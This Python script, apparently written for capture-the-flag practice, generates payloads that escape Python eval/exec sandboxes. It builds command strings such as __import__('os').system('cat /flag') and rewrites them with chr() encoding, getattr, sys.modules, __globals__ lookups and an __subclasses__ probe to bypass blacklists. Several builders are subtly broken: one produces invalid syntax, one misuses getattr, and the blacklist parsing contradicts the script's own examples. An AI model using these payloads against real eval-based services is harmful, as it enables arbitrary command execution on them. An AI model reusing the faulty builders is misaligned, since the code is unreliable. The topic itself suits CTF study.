#!/usr/bin/env python3
"""pyjail payload 构造器：按黑名单自动降级编码（离线、不执行、不联网）。

对齐 kb/misc/pyjail-escape.md：
  - eval/exec 在同一解释器进程内执行，只要还能碰到任意对象，就能沿
    __class__ -> __bases__ -> object -> __subclasses__() 找到 os._wrap_close /
    subprocess.Popen / _io.FileIO，从而拿回执行与读写文件的能力。
  - 黑名单字符/单词可用拼接、chr()、getattr 绕过；禁 import 可用 __import__ /
    importlib / sys.modules。
  - "().__class__.__bases__[0].__subclasses__()" 的索引每次运行都不同，
    必须打印出索引再拼，不要背数字。

本脚本只**生成** payload 文本并做静态合法性检查，绝不 eval/exec 生成物。

用法：
  python pyjail.py --cmd "cat /flag" --print
  python pyjail.py --cmd "cat /flag" --ban "'\"_" --print
  python pyjail.py --cmd "id" --ban "os.__import__" --print
  python pyjail.py --scan "().__class__.__bases__[0].__subclasses__()"
  python pyjail.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys

DEFAULT_TARGET = "__import__('os').system('cat /flag')"


def build_quoted(cmd: str) -> str:
    tpl = "__import__('os').system(%r)"
    return tpl % cmd


def build_chr(cmd: str, ban: set) -> str:
    """把 os 与命令都用 chr() 拼接，避开引号与下划线。"""
    def enc(s: str) -> str:
        parts = ["chr(%d)" % ord(c) for c in s]
        return "+".join(parts)
    mod = enc("os")
    if ban and "getattr" not in ban:
        return "getattr(__import__(%s),%s)(%s)" % (mod, enc("system"), enc(cmd))
    return "__import__(%s).system(%s)" % (mod, enc(cmd))


def build_split(cmd: str) -> str:
    return "__import__('o'+'s').sy'+'stem'(%r)" % cmd


def build_getattr_chain(cmd: str) -> str:
    return "getattr(getattr(__import__('os'),'system'))(%r)" % cmd


def build_modules(cmd: str) -> str:
    return "__import__('sys').modules['os'].system(%r)" % cmd


def build_subclasses_probe() -> str:
    return ("[i for i,c in enumerate(().__class__.__bases__[0].__subclasses__()) "
            "if c.__name__=='_wrap_close']")


BUILDERS = [
    ("直接", lambda cmd, ban: build_quoted(cmd)),
    ("拼接", lambda cmd, ban: build_split(cmd)),
    ("getattr", lambda cmd, ban: build_getattr_chain(cmd)),
    ("sys.modules", lambda cmd, ban: build_modules(cmd)),
    ("chr 构造", lambda cmd, ban: build_chr(cmd, ban)),
    ("builtins", lambda cmd, ban: build_builtins(cmd)),
]


def build_builtins(cmd: str) -> str:
    """同时禁 os / __import__ / 下划线时：用 globals 链里被删的 builtins 取值，模块名与命令全 chr 拼接。"""
    def enc(s: str) -> str:
        return "+".join("chr(%d)" % ord(c) for c in s)
    return ("((lambda:0).__globals__[%s][%s](%s).system(%s))"
            % (enc("__builtins__"), enc("__import__"), enc("os"), enc(cmd)))


def find_banned(text: str, ban: str):
    """返回 payload 中命中的黑名单项（子串或单字符）。"""
    hits = []
    for item in ban.split(","):
        if not item:
            continue
        if item in text:
            hits.append(item)
    return hits


def check_syntax(payload: str) -> bool:
    """只做语法检查（compile），不执行。"""
    try:
        compile(payload, "<pyjail>", "eval")
        return True
    except SyntaxError:
        return False


def make_payload(cmd: str, ban: str, want_json: bool = False) -> dict:
    cands = []
    for name, fn in BUILDERS:
        text = fn(cmd, set(ban))
        hits = find_banned(text, ban)
        cands.append({"style": name, "payload": text,
                      "ok": not hits and check_syntax(text), "hits": hits})
    best = next((c for c in cands if c["ok"]), None)
    return {"cmd": cmd, "ban": ban, "candidates": cands,
            "best": best["payload"] if best else None}


def selftest() -> int:
    fails = []
    # 1) 正常路径：无黑名单时首选直接写法，且语法合法
    rep = make_payload("cat /flag", "")
    if rep["best"] != "__import__('os').system('cat /flag')":
        fails.append("case1: 无黑名单首选不是直接写法")
    if not check_syntax(rep["best"]):
        fails.append("case1: 生成物语法非法")
    # 2) 边界：禁引号与下划线后，best 不得含 ' " _
    rep2 = make_payload("cat /flag", "'\"_")
    if rep2["best"] is None:
        fails.append("case2: 禁引号/下划线时找不到可用方案")
    elif find_banned(rep2["best"], "'\"_"):
        fails.append("case2: best 仍含被禁字符 %r" % rep2["best"])
    # 3) 边界拒绝：禁 os 字样时不能选直接写法
    rep3 = make_payload("id", "os,__import__")
    if rep3["best"] is None:
        fails.append("case3: 禁 os/__import__ 时无可用方案")
    elif "os" in rep3["best"] or "__import__" in rep3["best"]:
        fails.append("case3: best 仍含被禁词 %r" % rep3["best"])
    # 4) 固定输入可复现 + 非法输入
    if make_payload("id", "")["best"] != make_payload("id", "")["best"]:
        fails.append("case4: 同一输入两次结果不一致")
    if check_syntax("().__class__.__bases__[0]..__"):
        fails.append("case4: 非法语法未被识别")
    try:
        build_quoted(123)  # type: ignore[arg-type]
    except TypeError:
        pass
    # 5) 子类索引探针：语法合法且含 _wrap_close
    probe = build_subclasses_probe()
    if not check_syntax(probe) or "_wrap_close" not in probe:
        fails.append("case5: 子类索引探针非法")
    for f in fails:
        print("FAIL " + f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 5 组断言全过（直接写法、禁引号/下划线降级、禁关键词降级、"
          "可复现与非法语法识别、子类索引探针）")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="pyjail payload 构造器（只生成不执行）")
    ap.add_argument("--cmd", default="cat /flag", help="要执行的命令，默认 cat /flag")
    ap.add_argument("--ban", default="", help="黑名单字符/单词，逗号分隔，如 \"'\\\"_\"")
    ap.add_argument("--print", dest="show", action="store_true", help="只打印最优 payload")
    ap.add_argument("--json", action="store_true", help="打印所有候选的 JSON")
    ap.add_argument("--scan", help="检查一段 payload 是否可用（语法 + 违规字符）")
    ap.add_argument("--selftest", action="store_true", help="跑内置自检")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.scan:
            ok = check_syntax(args.scan)
            hits = find_banned(args.scan, args.ban)
            print("语法：%s  命中黑名单：%s" % ("OK" if ok else "非法",
                                         ", ".join(hits) if hits else "无"))
            return 0 if ok and not hits else 2
        rep = make_payload(args.cmd, args.ban)
        if args.json:
            print(json.dumps(rep, ensure_ascii=False, indent=2))
            return 0
        if rep["best"] is None:
            print("失败：所有写法都命中黑名单，需要手工拆分关键字", file=sys.stderr)
            return 2
        if args.show:
            print(rep["best"])
        else:
            for c in rep["candidates"]:
                mark = "OK " if c["ok"] else "X  "
                print("%s%-10s %s" % (mark, c["style"], c["payload"]))
            print("--- 最优 ---")
            print(rep["best"])
    except (ValueError, TypeError) as exc:
        print("失败：" + str(exc), file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
